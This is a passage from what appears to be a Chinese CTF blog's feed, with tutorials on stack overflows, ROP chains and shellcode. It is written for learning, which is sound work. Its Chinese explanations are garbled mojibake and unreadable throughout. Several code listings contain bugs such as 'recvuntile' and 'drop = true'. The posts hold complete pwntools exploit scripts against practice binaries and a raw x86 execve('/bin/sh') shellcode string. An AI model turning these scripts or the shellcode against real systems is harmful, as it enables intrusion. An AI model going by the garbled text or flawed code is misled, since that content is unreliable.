    <content type="html"><![CDATA[<p><strong>æˆ‘ä»¬å·²ç»å­¦ä¼šäº†ç¼–å†™å•ä¸ªå’Œä¸¤ä¸ªç®€å•å‡½æ•°çš„ROPé“¾ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬è¯´ä¸€ä¸‹ï¼Œç¼–å†™ROPé“¾å¤šä¸ªéœ€è¦æ³¨æ„çš„é—®é¢˜</strong><br><strong>ä¹‹å‰æˆ‘ä»¬åœ¨å­¦ä¹ ä¸¤ä¸ªå‡½æ•°çš„ROPæ—¶ï¼Œç¼–å†™äº†è¿™æ ·çš„payload</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182339706.png"><br><strong>æˆ‘ä»¬å½“æ—¶æ²¡æœ‰è€ƒè™‘ï¼Œå‚æ•°å†²çªå’Œæ ˆæº¢å‡ºå¤§å°ï¼Œç°åœ¨æˆ‘ä»¬æ¥è¯´ä¸€è¯´</strong><br><strong>ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœæˆ‘ä»¬ä¸Šæ¬¡å­¦ä¹ çš„ä¸¤ä¸ªå‡½æ•°çš„ROPä¸­æ²¡æœ‰getså‡½æ•°ï¼Œè€Œæ˜¯readå‡½æ•°æˆ‘ä»¬æ€ä¹ˆåŠï¼Œreadå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå¦‚æœæˆ‘ä»¬è¦åƒä»¥å‰ä¸€æ ·æ„å»ºpayloadï¼Œé‚£ä¹ˆreadçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œå°±ä¼šå’Œsystemçš„ç¬¬ä¸€ä¸ªå‚æ•°å†²çªï¼Œå¯¼è‡´æ— æ³•å°†system çš„ç¬¬ä¸€ä¸ªå‚æ•°æ”¾åœ¨æ ˆä¸Šï¼Œåœ¨ç¼–å†™å¤šä¸ªå‡½æ•°çš„ROPä¸­ä¼šé‡è§è¿™æ ·çš„é—®é¢˜ï¼Œå¦‚ä½•è§£å†³å‘¢ï¼Ÿ</strong></p><hr><p><strong>æˆ‘ä»¬éœ€è¦ç”¨åˆ°æŸä¸ªåœ°å€ä¸Šçš„ä»£ç ï¼Œè¿™ç§ä»£ç çš„åŸºæœ¬å½¢å¼ä¸ºpop*n + ret</strong><img src="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240616165524944-784500429.png"><br><strong>è¿ç”¨è¿™äº›å‘½ä»¤å°±èƒ½æŠŠå‚æ•°å¼¹å‡ºï¼Œæœ‰å‡ ä¸ªå‚æ•°å°±ç”¨å‡ ä¸ªpopå‘½ä»¤ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ROPgadgetåº“æ¥æŸ¥æ‰¾è¿™äº›å‘½ä»¤</strong></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182339232.png"><br><strong>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¯¹ä¸Šä¸€æ¬¡å­¦çš„â€™ç¼–å†™ä¸¤ä¸ªå‡½æ•°çš„ROPè¿›è¡Œæ”¹å˜ï¼Œä½¿å…¶å˜å¾—æ›´åˆç†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2libc2&quot;)<br>elf = ELF(&quot;./ret2libc2&quot;)<br>&quot;&quot;&quot;<br>ROPgadget --binary ./ret2libc2 --only &quot;pop|ret&quot;<br>Gadgets information<br>============================================================<br>0x0804861b : pop ebp ; ret<br>0x08048618 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x0804839d : pop ebx ; ret<br>0x0804861a : pop edi ; pop ebp ; ret<br>0x08048619 : pop esi ; pop edi ; pop ebp ; ret<br>0x08048386 : ret<br>0x0804848e : ret 0xeac1<br><br>Unique gadgets found: 7<br>&quot;&quot;&quot;<br><br>system = elf.plt[&quot;system&quot;]<br>gets = elf.plt[&quot;gets&quot;]<br>cmd = &quot;/bin/sh&quot;<br>bss_addr = 0x0804A200<br>pop1_ret = 0x0804861b<br>p.recvuntil(&quot;ret2libc2\n&quot;)<br>payload = &quot;a&quot; * 0x108 + p32(1)<br>payload += p32(gets) + p32(pop1_ret) + p32(bss_addr)<br>payload += p32(system) + p32(pop1_ret) + p32(bss_addr)<br>p.sendline(payload)<br>p.sendline(cmd)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>è¿™é‡Œçœ‹ä¸€ä¸‹payloadï¼Œæ ˆæº¢å‡ºä¹‹åæ§åˆ¶è¿”å›åœ°å€ä¸ºgetsï¼Œgetsçš„è¿”å›åœ°å€ä¸ºpop1_retï¼Œgetsçš„å‚æ•°çš„bssæ®µä¸€ä¸ªåœ°å€ï¼Œåœ¨æ‰§è¡Œå®Œgetsåè¿”å›pop1_retæ‰§è¡Œpopå‘½ä»¤ä½¿getsçš„å‚æ•°å‡ºæ ˆï¼Œç„¶åæ‰§è¡Œretï¼ˆpop eipï¼‰å‘½ä»¤ï¼Œæ§åˆ¶EIPä¸ºsystemåœ°å€ï¼Œsystemä¹Ÿæ˜¯ç›¸åŒåŸç†</strong></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¼–å†™ä¸¤ä¸ªå‡½æ•°çš„ROPé“¾</title>
    <link href="/2024/07/18/%E7%BC%96%E5%86%99%E4%B8%A4%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/"/>
    <url>/2024/07/18/%E7%BC%96%E5%86%99%E4%B8%A4%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p><strong>å­¦ä¼šäº†ç¼–å†™å•ä¸ªROPé“¾ï¼Œä»Šå¤©å°±è¿›é˜¶ä¸€ä¸‹ï¼Œå­¦ç¼–å†™ä¿©ä¸ªå‡½æ•°çš„ROPé“¾ã€‚é€šè¿‡ä¸€é“ä¾‹é¢˜æˆ‘ä»¬ç›´æ¥ä¸Šæ‰‹</strong></p><p>ä¾‹é¢˜ï¼š<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc2">é™„ä»¶ä¸‹è½½</a><br><strong>é¦–å…ˆæˆ‘ä»¬æŸ¥çœ‹ä¿æŠ¤</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182340349.png"></p><p><strong>IDAåç¼–è¯‘å‘ç°æ ˆæº¢å‡º</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182340701.png"><br><strong>ä½†æ˜¯æ²¡å‘ç°&#x2F;bin&#x2F;sh,è¿™æ˜¯æˆ‘ä»¬å°±æ— ä»ä¸‹æ‰‹äº†ï¼Œæˆ‘ä»¬è¦æƒ³ä¸€ä¸ªåŠæ³•åˆ›é€ &#x2F;bin&#x2F;shè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å‘ç°é¢˜ç›®æœ‰getså‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬èƒ½ä¸èƒ½é€šè¿‡getsè¾“å…¥&#x2F;bin&#x2F;shè¿™ä¸ªå­—ç¬¦ä¸²å‘¢ï¼Œæˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹</strong><br><strong>å…ˆé€šè¿‡æ ˆæº¢å‡ºæŠŠè¿”å›åœ°å€è¦†ç›–ä¸ºï¼Œgetså‡½æ•°ï¼Œé€šè¿‡æˆ‘ä»¬ä»¥å‰çš„å­¦ä¹ ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œå’Œgetsæ ˆå‘ä¸Šä¸¤ä¸ªå­—å°±æ˜¯getsçš„å‚æ•°ï¼Œä¹Ÿå³æ˜¯æˆ‘ä»¬è¾“å…¥å‚æ•°çš„åœ°å€ï¼Œè¿™ç‚¹ä¸ç†è§£çš„å¯ä»¥æŸ¥ä¸€ä¸‹getsè¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å°±ä¸å±•å¼€äº†ã€‚æˆ‘ä»¬å†æ§åˆ¶getsçš„è¿”å›åœ°å€ä¸ºsystemï¼Œå’Œsystemçš„å‚æ•°æˆ‘ä»¬ä¸å°±å®ç°äº†è¿›å…¥shelläº†å—ï¼Œpayloadå¦‚ä¸‹</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182340274.png"><br><strong>å¯¹äºè¿™é‡Œçš„bssæ®µï¼Œå¯ä»¥åœ¨ç½‘ä¸Šé˜…è¯»ä¸€ä¸‹ç›¸å…³çŸ¥è¯†ï¼Œè¿™æ ·æˆ‘ä»¬æ˜¯ä¸æ˜¯å°±æ§åˆ¶äº†ç¨‹åºè¿›å…¥shellï¼Œå¤§å®¶å¯ä»¥ä»”ç»†æ£æ‘©ä¸€ä¸‹ï¼Œç†è§£äº†ç¼–å†™è„šæœ¬å°±å¾ˆç®€å•</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>p = process(&quot;./ret2libc2&quot;)<br>elf = ELF(&quot;./ret2libc2&quot;)<br>system = elf.plt[&quot;system&quot;]<br>gets = elf.plt[&quot;gets&quot;]<br>cmd = &quot;/bin/sh&quot;<br>bss_addr = 0x0804A200<br>p.recvuntil(&quot;ret2libc2\n&quot;)<br>payload = &quot;a&quot; * 0x108 + &quot;junk&quot;<br>payload += p32(gets) + p32(system) + p32(bss_addr) + p32(bss_addr)<br>p.sendline(payload)<br>p.sendline(cmd)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¼–å†™å•ä¸ªå‡½æ•°çš„ROPé“¾</title>
    <link href="/2024/07/18/%E7%BC%96%E5%86%99%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/"/>
    <url>/2024/07/18/%E7%BC%96%E5%86%99%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯ROPé“¾"><a href="#ä»€ä¹ˆæ˜¯ROPé“¾" class="headerlink" title="ä»€ä¹ˆæ˜¯ROPé“¾"></a>ä»€ä¹ˆæ˜¯ROPé“¾</h2><p><strong>åœ¨æˆ‘åˆè¯†æ ˆæº¢å‡ºé‚£ç¯‡åšå®¢å·²ç»è¯¦ç»†çš„è®²äº†å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹ï¼ˆåŸºäºX86æ¡†æ¶ï¼‰ï¼Œä¸äº†è§£çš„å¯ä»¥çœ‹ä¸€ä¸‹ï¼Œæ²¡æœ‰è¿™ä¸ªç†è®ºåŸºç¡€ï¼Œæ˜¯å­¦ä¸å¥½ROPçš„ã€‚ç°åœ¨æˆ‘ä»¬è¯´ä¸€ä¸‹ä»€ä¹ˆæ˜¯ROP</strong>ã€‚</p><p><strong>ROPé“¾å°±æ˜¯é€šè¿‡è¿”å›åœ°å€çš„ä¿®æ”¹æ¥å®Œæˆçš„ç¼–ç¨‹ï¼Œè°ƒç”¨ç‰¹å®šçš„å‡½æ•°çš„ä¸€ç§ç¼–ç¨‹æ¨¡å¼ã€‚æˆ‘ä»¬å¯ä»¥è”æƒ³ä¸€ä¸‹ä½ åšçš„æœ€ç®€å•çš„æ ˆæº¢å‡ºçš„é¢˜ï¼Œè¿”å›åœ°å€è¦†ç›–systemï¼ˆ&#x2F;bin&#x2F;shï¼‰ã€‚è¿™ç§ä¹Ÿæ˜¯ä¸€ç§ROPé“¾ï¼Œåªæ˜¯æœ€ç®€å•çš„ä¸€ç§ï¼Œæ‰€ä»¥è¯´ROPä¹Ÿæ²¡æœ‰é‚£ä¹ˆé«˜ç«¯ï¼Œè¯´ç™½äº†å°±æ˜¯æ§åˆ¶è¿”å›åœ°å€ï¼Œæ§åˆ¶å‚æ•°ã€‚è¿™ç¯‡æˆ‘ä»¬æ¥è®²ä¸€ä¸‹æ€ä¹ˆæ§åˆ¶å‚æ•°</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338766.png"><br><strong>è¿™æ˜¯ä¸€ä¸ªmainå‡½æ•°è°ƒç”¨systemï¼ˆ&#x2F;bin&#x2F;sh)çš„æ ˆåˆ†å¸ƒï¼ŒæŠŠfuncå‡½æ•°çš„è¿”å›åœ°å€è¦†ç›–ä¸ºsystemçš„åœ°å€ï¼Œè¿™æ—¶å€™systemå°±ä¼šä½œä¸ºä¸€ä¸ªæ–°çš„å‡½æ•°è¿›å…¥å‡½æ•°å†…éƒ¨ï¼Œå¼€è¾Ÿæ ˆå¸§ï¼Œæ‰§è¡Œâ€˜push edpï¼›mov edpï¼Œespï¼›sub espï¼Œ0x â€™ã€‚</strong></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338135.png"></p><p><strong>æ ¹æ®æˆ‘ä»¬å­¦ä¹ å‡½æ•°è°ƒç”¨çš„ç†è®ºçŸ¥è¯†ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œè¿™æ—¶å€™å¯¹äºsystemå‡½æ•°ï¼Œaå°±æ˜¯å®ƒçš„è¿”å›åœ°å€ï¼Œbå°±æ˜¯å®ƒçš„å‚æ•°ï¼Œæ‰€ä»¥å°±å¯ä»¥ç¼–å†™è„šæœ¬æ§åˆ¶bçš„å†…å®¹æ¥å®ç°æ§åˆ¶å‚æ•°çš„ä¼ å…¥ï¼Œä¸‹é¢æ¥å°è¯•ç‰›åˆ€</strong></p><p>ä¾‹é¢˜ï¼š<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc1">é™„ä»¶ä¸‹è½½</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338180.png"></p><p><strong>æŸ¥çœ‹ä¿æŠ¤ï¼Œå¼€äº†åœ°å€éšæœºåŒ–ï¼Œå¼€äº†NXï¼Œé‚£æˆ‘ä»¬å°±ä¸èƒ½ç”¨Shellcodeäº†ï¼ŒIDAåç¼–è¯‘ä¸€ä¸‹ï¼Œçœ‹çœ‹æ€ä¹ˆä¸ªäº‹</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338789.png"></p><p><strong>éå¸¸ç®€å•çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰å‘ç°åé—¨å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦†ç›–è¿”å›åœ°å€ä¸ºsystemï¼Œä¼ å…¥å˜é‡&#x2F;bin&#x2F;shï¼Œshift+F12æ‰“å¼€stringå‘ç°&#x2F;bin&#x2F;sh ï¼Œç›´æ¥ç¼–å†™è„šæœ¬</strong></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182339306.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&#x27;./ret2libc1&#x27;)<br>elf = ELF(&#x27;./ret2libc1&#x27;)<br>system_addr = elf.plt[&#x27;system&#x27;]<br>binsh_addr = 0x0804A028<br>p.recvuntil(&#x27;ret2libc1\n&#x27;)<br>payload = 0x108 * b&#x27;a&#x27; + p32(1) + p32(system_addr) + p32(1) + p32(binsh_addr)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shellcode</title>
    <link href="/2024/07/18/Shellcode/"/>
    <url>/2024/07/18/Shellcode/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯Shellcode"><a href="#ä»€ä¹ˆæ˜¯Shellcode" class="headerlink" title="ä»€ä¹ˆæ˜¯Shellcode"></a>ä»€ä¹ˆæ˜¯Shellcode</h2><p><strong>ShellcodeæŒ‡çš„æ˜¯ç”¨æ¥å®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œå¸¸ç”¨çš„åŠŸèƒ½å°±æ˜¯è·å–ç›®æ ‡ç³»ç»Ÿçš„shellã€‚åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬ä¸€èˆ¬éƒ½æ˜¯å‘æ ˆä¸­å†™å†…å®¹ï¼Œæ‰€ä»¥è¦æƒ³æ‰§è¡ŒShellcodeï¼Œå°±è¦è¦æ±‚å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰å¼€å¯NXä¿æŠ¤ã€‚åˆ©ç”¨ret_addressè¿”å›Shellcodeå¤„æ‰§è¡Œ</strong></p><h2 id="æ€ä¹ˆç”ŸæˆShellcode"><a href="#æ€ä¹ˆç”ŸæˆShellcode" class="headerlink" title="æ€ä¹ˆç”ŸæˆShellcode"></a>æ€ä¹ˆç”ŸæˆShellcode</h2><p><strong>Shellcodeçš„ç”Ÿæˆæ–¹æ³•é€šå¸¸æœ‰ä»¥ä¸‹å‡ ç§ï¼š</strong></p><ol><li>åœ¨pwntoolsä¸­ç”±shellcraftæ¨¡å—ç”Ÿæˆ</li><li>åœ¨<a href="https://www.exploit-db.com/shellcodes/">https://www.exploit-db.com/shellcodes/</a>ç½‘ç«™ä¸­æ ¹æ®å¹³å°å’Œç³»ç»Ÿçš„ä½æ•°è·å–</li><li>é€šè¿‡Metasploitç”Ÿæˆ</li></ol><h3 id="1ã€æ ¹æ®pwntoolsç”ŸæˆShellcode"><a href="#1ã€æ ¹æ®pwntoolsç”ŸæˆShellcode" class="headerlink" title="1ã€æ ¹æ®pwntoolsç”ŸæˆShellcode"></a>1ã€æ ¹æ®pwntoolsç”ŸæˆShellcode</h3><p>ä¾‹é¢˜ï¼š<a href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/ret2shellcode">é™„ä»¶ä¸‹è½½</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182336382.png"><br>æŸ¥çœ‹ä¿æŠ¤æ²¡æœ‰å¼€NXï¼Œå¯ä»¥ç”¨Shellcode<br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407190000793.png"><br>IDAåç¼–è¯‘å‘ç°æ ˆæº¢å‡ºï¼Œç›´æ¥ç”¨Shellcodeè¦†ç›–main_addråœ°å€æ§åˆ¶ç¨‹åºæµ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>context.arch = &quot;i386&quot;<br>p = process(&#x27;./ret2shellcode&#x27;)<br>p.recvuntil(&quot;ret2shellcode&quot;)<br>target = int(p.recvuntile(&quot;\n&quot;,drop = true) , 16)<br>sc = asm(shellcraft.sh())<br>payload = sc.ljust(0x108 ,&#x27;\x00&#x27;) + p32(1) + p32(target)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>è§£é‡Šï¼štarget &#x3D; int(p.recvuntile(â€œ\nâ€,drop &#x3D; true) , 16)æ¥æ”¶ç›´åˆ°æ¢è¡Œç¬¦ï¼Œå¹¶ä¸”å»é™¤æ¢è¡Œç¬¦ï¼Œè½¬æ¢ä¸º16è¿›åˆ¶</strong></p><h2 id="2ã€Shellcodeè¿›é˜¶"><a href="#2ã€Shellcodeè¿›é˜¶" class="headerlink" title="2ã€Shellcodeè¿›é˜¶"></a>2ã€Shellcodeè¿›é˜¶</h2><p>ä¾‹é¢˜ï¼š<a href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w">https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337778.png"><br><strong>æ²¡æœ‰å¼€NXä¿æŠ¤ï¼Œå¯ä»¥ä½¿ç”¨Shellccode</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337746.png"><br><strong>å‘ç°æº¢å‡ºåå…«ä¸ªå­—èŠ‚ï¼Œéå¸¸å°ï¼Œæ‰€ä»¥ç”¨pwntoolsç”Ÿæˆçš„Shellcodeé•¿åº¦å¤ªé•¿ï¼Œè¿™é‡Œéœ€è¦ç”¨gadgetæ¥æ§åˆ¶EIPçš„ä½ç½®ï¼Œè·³è½¬åˆ°Shellcodeçš„åˆå§‹åœ°å€</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>p = process(&#x27;./b0verfl0w&#x27;)<br><br>shellcode_x86 = &#x27;\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80&#x27;<br>sub_esp_jmp = asm(&#x27;sub esp , 0x28;jmp esp&#x27;)<br>jmp_esp = 0x08048504<br>payload = shellcode_x86.ljust(0x24 , &#x27;a&#x27;) +  p32(jmp_esp) + sub_esp_jmp<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>ä»payloadèµ·å§‹åœ°å€å¼€å§‹æ„é€ Shellcodeï¼Œä¹‹åè°ƒæ•´espåˆ°Shellcodeèµ·å§‹ä½ç½®</strong>ã€</p><blockquote><p>ä¸ºä»€ä¹ˆè¦ç”¨jmp_espè€Œä¸æ˜¯ç›´æ¥ç”¨Shellcodeè¦†ç›–è¿”å›åœ°å€ï¼Ÿ<br>å½“pop main_addråespåœ¨main_ä¸Šè¾¹ï¼Œç›´æ¥æ‰§è¡Œsub_esp_jmpåœ¨æ ˆå¤–æ‰§è¡Œï¼Œä¼šå¼‚å¸¸ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŠŠEIPè°ƒæ•´åˆ°æ ˆå†…å†æŠŠEIPæ§åˆ¶åˆ°sub_esp_jmpè¿™æ ·å°±æ²¡æœ‰é—®é¢˜äº†</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆè¯†æ ˆæº¢å‡º</title>
    <link href="/2024/07/18/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2024/07/18/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="è®¤è¯†æ ˆç»“æ„"><a href="#è®¤è¯†æ ˆç»“æ„" class="headerlink" title="è®¤è¯†æ ˆç»“æ„"></a>è®¤è¯†æ ˆç»“æ„</h2><p><strong>æ ˆè¿™ç§ç»“æ„å­¦è¿‡æ•°æ®ç»“æ„çš„éƒ½çŸ¥é“ï¼Œæ˜¯ä¸€ç§å…ˆè¿›åå‡ºçš„ç»“æ„ï¼Œç±»ä¼¼äºå­å¼¹æ”¾è¿›å¼¹å¤¹ä¸€æ ·ï¼Œå…ˆæ”¾è¿›çš„å­å¼¹æœ€åæ‰“å‡ºã€‚</strong></p><h2 id="å‡½æ•°è°ƒç”¨è¿‡ç¨‹"><a href="#å‡½æ•°è°ƒç”¨è¿‡ç¨‹" class="headerlink" title="å‡½æ•°è°ƒç”¨è¿‡ç¨‹"></a>å‡½æ•°è°ƒç”¨è¿‡ç¨‹</h2><p><strong>è¿™ä¸ªçŸ¥è¯†æ˜¯æ•´ä¸ªæ ˆæ–¹é¢çš„å…³é”®çŸ¥è¯†ï¼Œæˆ‘åœ¨å¤§ä¸€çš„æ—¶å€™å­¦pwnæ€ä¹ˆä¹Ÿå­¦ä¸ä¼šï¼Œå°±æ˜¯å¿½ç•¥äº†å¯¹åŸºç¡€çŸ¥è¯†çš„å­¦ä¹ ï¼Œç›´æ¥å­¦æ¼æ´ï¼Œä¸€ç›´æä¸æ¸…æ€ä¹ˆå›äº‹ï¼Œéå¸¸éƒé—·ã€‚ç°åœ¨è¯¦ç»†æ€»ç»“ä¸€ä¸‹å‡½æ•°è°ƒç”¨è¿‡ç¨‹ï¼Œä»¥X86ç³»ç»Ÿä¸ºä¾‹</strong></p><ol><li><p>å‹å…¥å‚æ•°<br><strong>æ ¹æ®è°ƒç”¨çº¦å®šå‹å…¥å‚æ•°ï¼Œmainå‡½æ•°ä½œä¸ºè°ƒç”¨è€…ï¼Œé¦–å…ˆå°†funçš„å‚æ•°a,bâ€¦å‹æ ˆã€‚æ ˆæ˜¯å‘ä¸‹ç”Ÿé•¿çš„ï¼Œå…ˆå‹å…¥çš„å‚æ•°é è¿‘æ ˆé¡¶espï¼Œåå‹å…¥çš„é è¿‘æ ˆåº•edp</strong></p></li><li><p>è¿”å›åœ°å€å‹å…¥<br><strong>funå‡½æ•°è°ƒç”¨å®Œæˆï¼Œç¨‹åºéœ€è¦è¿”å›æºåœ°å€ç»§ç»­æ‰§è¡Œç¨‹åºï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å»è¦ä¿å­˜è°ƒç”¨å‡½æ•°ä¸‹ä¸€å¥çš„åœ°å€ï¼ŒæŠŠå®ƒå‹å…¥æ ˆä¸­ï¼Œä»¥ä¾¿æˆ‘ä»¬æ¢å¤åŸç¨‹åºç»§ç»­æ‰§è¡Œ</strong></p></li><li><p>funå‡½æ•°è¿è¡Œ<br><strong>funå‡½æ•°è¿è¡Œä¼šç»™è‡ªå·±å†å¼€è¾Ÿä¸€ä¸ªæ ˆï¼Œè¿™ä¸ªæ ˆçš„æ ˆåº•å°±æ˜¯ä¸Šä¸ªæ ˆçš„æ ˆé¡¶ï¼Œå› ä¸ºå½“è°ƒç”¨å‡½æ•°æ—¶ï¼Œæ‰§è¡Œcallå‘½ä»¤ï¼Œä¼šæ‰§è¡Œè¿™å‡ æ¡æ±‡ç¼–â€˜push edpï¼›mov edp ï¼Œespï¼›sub espï¼Œ0x â€™è¿™å¥è¯å¯ä»¥ç”»å›¾æ¥ä½“ä¼šä¸€ä¸‹ã€‚push edpï¼›æ˜¯ä¸ºäº†ä¿å­˜è°ƒç”¨å‡½æ•°çš„æ ˆå¸§ï¼Œè°ƒç”¨å‡½æ•°ç»“æŸåè¦æ¢å¤åŸå‡½æ•°çš„edpï¼Œespã€‚mov edp ï¼Œespï¼›æŠŠespçš„å€¼èµ‹å€¼ç»™edpï¼Œè¿™æ ·å°±æŠŠæ–°æ ˆå¸§çš„æ ˆåº•ç¡®å®šäº†ã€‚sub esp ï¼Œ0xï¼Œè¿™å¥è¯ä¸ºæ ˆå¼€è¾Ÿç©ºé—´ï¼Œespå°±ç¡®å®šäº†ï¼Œå®Œæˆä¸€ä¸ªæ–°æ ˆå¼€è¾Ÿ</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182341420.png"></p></li><li><p>funå‡½æ•°è¿”å›<br><strong>å½“å‡½æ•°è¿è¡Œå®Œæˆä¹‹åï¼Œå‡½æ•°è¿™ä¹ˆè¿”å›å‘¢ï¼Ÿå‡½æ•°ä¸€èˆ¬ä¼šæ‰§è¡Œâ€˜leaveï¼›retï¼›â€™è¿™å¥è¯ä»€ä¹ˆå«ä¹‰ï¼Œå°±æ˜¯â€˜mov esp ï¼Œedpï¼›pop edpï¼›pop eipâ€™ æˆ‘ä»¬æ¥è§£è¯»ä¸€ä¸‹ï¼Œé¦–å…ˆæŠŠæ ˆé¡¶ç§»åŠ¨åˆ°æ ˆåº•ï¼Œç›¸å½“äºæ¢å¤æ 